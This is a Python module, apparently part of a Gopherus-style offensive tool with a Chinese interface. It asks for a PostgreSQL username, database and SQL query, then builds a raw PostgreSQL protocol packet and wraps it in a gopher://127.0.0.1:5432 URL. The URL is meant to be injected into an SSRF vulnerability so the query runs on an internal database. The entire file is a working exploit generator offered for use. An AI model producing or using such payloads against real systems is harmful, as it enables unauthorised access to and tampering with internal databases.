from .colors import c, DIM, BOLD, CYAN, YELLOW, GREEN, RED, UNDERLINE, BRIGHT_CYAN, BRIGHT_GREEN, BRIGHT_YELLOW, print_banner, print_step, print_info, print_success, print_warning


def PostgreSQL():
    print_banner("PostgreSQL SSRF 利用")

    print_step(1, "配置连接信息")
    print_info("输入 PostgreSQL 用户名")
    user = input(c("  > 用户名 (默认 postgres): ", CYAN))
    if not user:
        user = "postgres"
        print_info(f"使用默认值: {user}")

    print_info("输入目标数据库名称")
    db = input(c("  > 数据库名 (默认 postgres): ", CYAN))
    if not db:
        db = "postgres"
        print_info(f"使用默认值: {db}")

    print_step(2, "配置 SQL 查询")
    print_info("输入要执行的 SQL 查询语句")
    print_warning("示例: SELECT version(), SELECT current_database()")
    query = input(c("  > SQL 查询: ", CYAN))
    while not query:
        print(c("  [x] 查询语句不能为空", RED))
        query = input(c("  > SQL 查询: ", CYAN))

    encode_user = user.encode("utf-8").hex()
    encode_db = db.encode("utf-8").hex()
    encode_query = query.encode("utf-8").hex()
    len_query = len(query) + 5

    start = (
        "000000"
        + chr(4 + len(user) + 8 + len(db) + 13).encode("utf-8").hex()
        + "000300"
    )
    data = (
        "00"
        + "user".encode("utf-8").hex()
        + "00"
        + encode_user
        + "00"
        + "database".encode("utf-8").hex()
        + "00"
        + encode_db
    )
    data += f"0000510000{str(hex(len_query)[2:]).zfill(4)}"
    data += encode_query
    end = "005800000004"

    packet = start + data + end

    def encode(s):
        a = [s[i : i + 2] for i in range(0, len(s), 2)]
        return "gopher://127.0.0.1:5432/_%" + "%".join(a)

    print_banner("利用链接已生成")
    print("")
    print(c("  将以下 URL 编码到 SSRF 漏洞中:", CYAN))
    print("")
    print(c("  " + "-" * 48, DIM))
    print(c(encode(packet), UNDERLINE + YELLOW))
    print(c("  " + "-" * 48, DIM))
    print("")
    print_success(f"将执行查询: {query}")

    print("\n" + c("  " + "=" * 48, BRIGHT_CYAN))
    print(c("  原作者: $_SpyD3r_$", BRIGHT_CYAN))
    print(c("  修改者: @_mingy_@", BRIGHT_CYAN))
    print(c("  " + "=" * 48, BRIGHT_CYAN))
